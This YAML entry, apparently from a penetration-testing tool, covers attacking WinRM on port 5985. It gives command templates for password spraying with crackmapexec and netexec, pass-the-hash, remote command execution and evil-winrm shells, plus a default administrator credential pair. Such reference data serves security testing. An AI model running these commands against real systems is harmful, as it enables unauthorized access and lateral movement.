schema_version: 1
port: 5985
service: winrm
protocol: tcp
risk: high
aliases:
  - wsman
  - http-wsman
quick_facts:
  - "WinRM = remote PowerShell — credentials grant interactive shell"
  - "5985 = HTTP, 5986 = HTTPS"
  - "evil-winrm is the canonical exploitation tool"
checks:
  - key: winrm-port-open
    label: "Confirmed WinRM listening on 5985/5986"
  - key: winrm-creds
    label: "Tested discovered credentials"
  - key: winrm-shell-access
    label: "Obtained interactive shell via evil-winrm"
  - key: winrm-password-spray
    label: "Sprayed credentials with netexec across the AD population"
  - key: winrm-pth
    label: "Tested pass-the-hash (no plaintext password needed)"
commands:
  - label: "nmap WinRM"
    template: "nmap -p{PORT} --script=http-wsdiscover,http-wsman {IP}"
  - label: "crackmapexec WinRM spray (legacy)"
    template: "crackmapexec winrm {IP} -u users.txt -p passwords.txt"
  - label: "netexec / nxc WinRM spray"
    template: "nxc winrm {IP} -u users.txt -p passwords.txt --continue-on-success"
  - label: "netexec WinRM exec (one-off command)"
    template: "nxc winrm {IP} -u <user> -p <pass> -x 'whoami /all'"
  - label: "netexec WinRM pass-the-hash"
    template: "nxc winrm {IP} -u <user> -H <NT-hash>"
  - label: "evil-winrm interactive shell"
    template: "evil-winrm -i {IP} -u administrator -p 'password'"
  - label: "evil-winrm pass-the-hash"
    template: "evil-winrm -i {IP} -u administrator -H <NT-hash>"
default_creds:
  - username: administrator
    password: administrator
    notes: "Weak admin password reuse"
known_vulns:
  - match: "Windows WinRM"
    note: "Credential reuse + lateral movement primary use case"
    link: "https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm"
resources:
  - title: "5985 - Pentesting WinRM"
    url: "https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm"
    author: HackTricks
